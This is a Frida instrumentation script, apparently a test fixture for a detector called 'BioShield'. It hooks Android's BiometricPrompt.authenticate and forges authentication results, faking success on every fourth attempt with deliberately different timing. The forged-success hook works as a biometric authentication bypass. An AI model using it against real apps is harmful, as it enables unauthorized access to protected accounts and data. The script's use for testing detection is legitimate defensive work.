// === TIMING CORRELATION ATTACK DEMONSTRATION ===
// This script creates different timing for success vs failure
// BioShield should detect: TIMING_CORRELATION

console.log("=== [ATTACK] Timing Correlation Attack Script Loaded ===");

let attemptCount = 0;

Java.perform(() => {
    try {
        const BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");

        console.log("[+] Hooking BiometricPrompt.authenticate()");

        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {
            attemptCount++;
            const isSuccess = (attemptCount % 4 === 0); // Every 4th attempt succeeds

            console.log("[ATTACK] Attempt #" + attemptCount + " - Will " + (isSuccess ? "SUCCEED" : "FAIL"));

            const result = this.authenticate(info);

            // ATTACK: Different timing for success vs failure
            // This leaks information through timing side-channel!
            const delay = isSuccess ? 2000 : 800; // Success takes longer!

            console.log("[ATTACK] Using timing: " + delay + "ms for " + (isSuccess ? "success" : "failure"));

            setTimeout(() => {
                try {
                    const callbackField = this.class.getDeclaredField("mAuthenticationCallback");
                    callbackField.setAccessible(true);
                    const callback = callbackField.get(this);

                    if (callback) {
                        if (isSuccess) {
                            const AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
                            const fakeResult = AuthResult.$new(null, 2);
                            console.log("[ATTACK] Triggering SUCCESS after " + delay + "ms");
                            callback.onAuthenticationSucceeded(fakeResult);
                        } else {
                            console.log("[ATTACK] Triggering FAILURE after " + delay + "ms");
                            callback.onAuthenticationFailed();
                        }
                    }
                } catch (e) {
                    console.log("[ERROR] Failed to trigger callback: " + e);
                }
            }, delay);

            return result;
        };

        console.log("[OK] Timing correlation attack ready");
        console.log("[!] Attack pattern:");
        console.log("    - Success timing: 2000ms");
        console.log("    - Failure timing: 800ms");
        console.log("    - Difference: 1200ms (leaks success/fail info!)");
        console.log("[!] Expected BioShield detection:");
        console.log("    - TIMING_CORRELATION: >50ms difference");
        console.log("    - Side-channel score: ~30-60/100");

    } catch (e) {
        console.log("[-] Failed to hook BiometricPrompt: " + e);
    }
});
